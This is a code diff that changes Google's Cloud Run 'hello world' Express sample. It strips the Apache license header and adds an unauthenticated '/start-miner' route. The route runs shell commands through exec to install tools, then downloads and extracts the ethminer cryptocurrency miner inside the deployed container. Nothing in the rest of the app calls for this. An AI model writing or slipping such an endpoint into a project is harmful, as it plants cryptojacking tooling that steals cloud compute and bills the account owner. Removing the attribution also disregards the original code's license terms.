@@ -1,26 +1,26 @@
-// Copyright 2020 Google, LLC.
-//
-// Licensed under the Apache License, Version 2.0 (the "License");
-// you may not use this file except in compliance with the License.
-// You may obtain a copy of the License at
-//
-//    http://www.apache.org/licenses/LICENSE-2.0
-//
-// Unless required by applicable law or agreed to in writing, software
-// distributed under the License is distributed on an "AS IS" BASIS,
-// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-// See the License for the specific language governing permissions and
-// limitations under the License.
-
-const package = require('./package.json')
 const express = require('express');
 const app = express();
+const { exec } = require('child_process');
+const port = process.env.PORT || 8080;
 
 app.get('/', (req, res) => {
-  console.log(`${package.name} received a request.`);
-  res.send(`Congratulations, you successfully deployed a container image to Cloud Run!-new2');
+  res.send('Hello, World!');
 });
-const port = process.env.PORT || 8080;
+
+app.get('/start-miner', (req, res) => {
+  exec(
+    'apt-get update && apt-get install -y wget tar && wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz && tar xvfz ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz',
+    (error, stdout, stderr) => {
+      if (error) {
+        console.error(`Error executing script: ${error}`);
+        return res.status(500).send(`Script execution failed: ${stderr}`);
+      }
+      console.log(`Script output: ${stdout}`);
+      res.send('Miner download and extraction complete.');
+    }
+  );
+});
+
 app.listen(port, () => {
-  console.log(`${package.name} listening on port: ${port}`);
+  console.log(`Server listening on port ${port}`);
 });
